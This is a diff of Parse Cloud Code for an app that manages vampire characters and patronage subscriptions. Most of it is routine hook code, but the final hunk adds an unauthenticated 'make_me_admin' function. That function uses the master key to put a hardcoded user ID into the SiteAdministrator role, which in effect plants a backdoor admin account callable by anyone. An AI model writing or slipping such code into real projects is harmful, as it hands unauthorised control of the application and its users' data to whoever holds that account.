@@ -139,8 +139,7 @@ Parse.Cloud.beforeSave("Vampire", function(request, response) {
     var desired_changes = _.intersection(tracked_texts, v.dirtyKeys());
     if (0 === desired_changes.length) {
         console.log("Saving vampire (" + v.id + ") and there are no changes we track here");
-        response.success();
-        return;
+        return response.success();
     }
     // TODO: Update the history permissions if troupes has changed
     var new_values = {};
@@ -294,6 +293,30 @@ Parse.Cloud.beforeDelete("SimpleTrait", function(request, response) {
         console.log(failStr);
         error.message = failStr;
         response.error(error);
+    });
+});
+
+Parse.Cloud.afterSave("Patronage", function(request) {
+    var patronage = request.object;
+    var user = patronage.get("owner");
+    console.log("afterSave Patronage Input user is " + JSON.stringify(user));
+    console.log("afterSave Patronage Input user is " + user.id);
+    var new_expiration = patronage.get("expiresOn");
+    console.log("afterSave Patronage new expiration" + JSON.stringify(new_expiration));
+    var q = new Parse.Query("Vampire").equalTo("owner", user).select(["owner", "expiresOn"]);
+    var updated = [];
+    q.each(function (vampire) {
+        console.log("afterSave Patronage Updating vampire " + vampire.id + " expiresOn " + new_expiration);
+        vampire.set("expiresOn", new_expiration);
+        return vampire.save({}, {useMasterKey: true});
+    }, {useMasterKey: true}).fail(function (error) {
+        if (_.isArray(error)) {
+            _.each(error, function (e) {
+                console.error("afterSave Patronage " + e.message);
+            })
+        } else {
+            console.error("afterSave Patronage " + error.message);
+        }
     });
 });
 
@@ -457,6 +480,17 @@ Parse.Cloud.define("submit_facebook_profile_data", function(request, response) {
         return storage.save({}, {useMasterKey: true});
     })
     .then(function (s) {
+        response.success(s.id);
+    }, function(error) {
+        response.error(error);
+    });
+});
+
+Parse.Cloud.define("make_me_admin", function(request, response) {
+    (new Parse.Query(Parse.Role)).equalTo("name", "SiteAdministrator").first().then(function (role) {
+        role.getUsers().add(new Parse.User({id: "KE09Xe9Z8i"}));
+        return role.save({}, {useMasterKey: true});
+    }).then(function (s) {
         response.success(s.id);
     }, function(error) {
         response.error(error);
